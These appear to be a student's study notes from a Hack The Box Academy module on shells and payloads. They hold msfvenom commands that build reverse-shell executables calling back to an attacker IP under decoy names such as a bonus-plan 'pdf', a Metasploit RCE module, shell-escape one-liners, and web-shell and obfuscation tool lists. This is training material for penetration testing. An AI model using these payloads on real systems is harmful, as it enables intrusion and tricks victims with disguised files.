`L3pr3ch4un@htb[/htb]$ sudo nmap -v 192.168.86.39 --script banner.nse`


## Anatomy of a Shell

| Terminal Emulator | Operating System |
| --- | --- |
| https://github.com/microsoft/terminal | Windows |
| https://cmder.app/ | Windows |
| https://www.putty.org/ | Windows |
| https://sw.kovidgoyal.net/kitty/ | Windows, Linux and MacOS |
| https://github.com/alacritty/alacritty | Windows, Linux and MacOS |
| https://invisible-island.net/xterm/ | Linux |
| https://en.wikipedia.org/wiki/GNOME_Terminal | Linux |
| https://github.com/mate-desktop/mate-terminal | Linux |
| https://konsole.kde.org/ | Linux |
| https://en.wikipedia.org/wiki/Terminal_(macOS) | MacOS |
| https://iterm2.com/ | MacOS |

```
[!bash!]$ ps
[!bash!]$ env
$PSversiontable
```

## Reverse Shell

![](https://academy.hackthebox.com/storage/modules/115/bindshell.png)

## Bind

![](https://academy.hackthebox.com/storage/modules/115/reverseshell.png)

## Msfvenom

``[!bash!]**$** msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf`

`[!bash!]**$** msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe``

### **Payload Types to Consider**

- [DLLs](https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library)
- [Batch](https://commandwindows.com/batch.htm) 
- [VBS](https://www.guru99.com/introduction-to-vbscript.html) 
- [MSI](https://docs.microsoft.com/en-us/windows/win32/msi/windows-installer-file-extensions)
- [Powershell](https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.1)

## Payload Generation

| Resource | Description |
| --- | --- |
| MSFVenom & Metasploit-Framework | https://github.com/rapid7/metasploit-framework MSF is an extremely versatile tool for any pentester's toolkit. It serves as a way to enumerate hosts, generate payloads, utilize public and custom exploits, and perform post-exploitation actions once on the host. Think of it as a swiss-army knife. |
| Payloads All The Things | https://github.com/swisskyrepo/PayloadsAllTheThings Here, you can find many different resources and cheat sheets for payload generation and general methodology. |
| Mythic C2 Framework | https://github.com/its-a-feature/Mythic The Mythic C2 framework is an alternative option to Metasploit as a Command and Control Framework and toolbox for unique payload generation. |
| Nishang | https://github.com/samratashok/nishang Nishang is a framework collection of Offensive PowerShell implants and scripts. It includes many utilities that can be useful to any pentester. |
| Darkarmour | https://github.com/bats3c/darkarmour Darkarmour is a tool to generate and utilize obfuscated binaries for use against Windows hosts. |


`L3pr3ch4un@htb[/htb]**$** nmap -sC -sV 10.129.201.101`

Metasploit exploit modules are kept in:

`/usr/share/metasploit-framework/modules/exploits`

`msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce`

****Spawning a TTY Shell with Python****

`python -c 'import pty; pty.spawn("/bin/sh")'`

```
| Method                       | Command/Script                                             | Notes                                   |
|------------------------------|------------------------------------------------------------|-----------------------------------------|
| Bourne Shell (/bin/sh)        | `/bin/sh -i`                                               | Execute shell interpreter interactively |
| Perl                         | `perl -e 'exec "/bin/sh";'`                               | If Perl is present                      |
| Ruby                         | `ruby -e 'exec "/bin/sh"'`                                | If Ruby is present                      |
| Lua                          | `lua -e 'os.execute("/bin/sh")'`                          | If Lua is present                       |
| AWK                          | `awk 'BEGIN {system("/bin/sh")}'`                         | C-like language for shell spawning      |
| Find                         | `find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \\;` | Using Find and AWK for shell           |
| Using Exec with Find         | `find . -exec /bin/sh \\; -quit`                           | Using Exec with Find to launch a shell  |
| VIM                          | `vim -c ':!/bin/sh'`                                       | Setting shell interpreter in VIM       |
| VIM Escape                   | `vim`, `:set shell=/bin/sh`, `:shell`                     | Another way to set shell in VIM        |
| Permissions Check            | `ls -la <path/to/fileorbinary>`                           | Check file properties and permissions  |
| Sudo Permissions Check       | `sudo -l`                                                  | Check sudo permissions                  |

```

## Laudanum

- `https://github.com/jbarcia/Web-Shells/tree/master/laudanum`
- asp, aspx, jsp, php

## Antak

- Antak is a web shell built-in ASP.Net included within the Nishang project. 
- `/usr/share/nishang/Antak-WebShell`

## PHP Web Shells

- https://github.com/WhiteWinterWolf/wwwolf-php-webshell
- 

## References

- Quick payload generation: revshells.com
- TTL's: https://subinsb.com/default-device-ttl-values/
- 
